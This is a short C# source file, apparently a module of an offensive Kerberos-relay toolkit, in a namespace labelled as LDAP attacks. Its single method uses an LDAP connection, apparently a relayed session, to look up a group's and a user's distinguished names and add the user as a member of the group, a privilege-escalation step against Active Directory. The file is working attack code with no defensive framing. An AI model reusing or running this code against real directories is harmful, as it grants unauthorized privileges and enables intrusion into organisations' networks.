using System;
using System.Text;

namespace KrbRelay.Clients.Attacks.Ldap
{
    internal class AddGroupMember
    {
        public static LdapStatus attack(IntPtr ld, string group, string user)
        {
            string groupDn = Generic.GetAttributeWithAccountNameAsString(ld, group, "distinguishedName");
            string userDn = Generic.GetAttributeWithAccountNameAsString(ld, user, "distinguishedName");
            return Generic.AddAttribute(ld, groupDn, "member", Encoding.ASCII.GetBytes(userDn));
        }
    }
}
